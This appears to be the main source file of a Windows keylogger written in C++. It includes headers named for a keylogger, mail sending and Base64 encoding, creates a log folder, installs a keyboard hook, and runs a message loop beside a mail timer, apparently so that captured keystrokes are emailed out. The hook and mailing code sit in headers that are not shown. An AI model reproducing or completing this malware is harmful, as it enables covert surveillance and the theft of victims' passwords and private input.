#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "HelperHeaders.h"
#include "Base64.h"
#include "InputOutput.h"
#include "Time_Reference.h"
#include "Mail_Send.h"
#include "Heart_Keylogger.h"
using namespace std;

int main()
{
    //Eliminate the console problem
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true)); //Creates the path of the log file
    InstallHook();
    while(GetMessage (&Msg, NULL, 0, 0))
    {
        //it's never gonna happen
        TranslateMessage(&Msg);  //It will take a message from program that is intended for any window
        DispatchMessage(&Msg);  //Forwards the same message to the system
    }
    MailTimer.Stop();
    return 0;
}
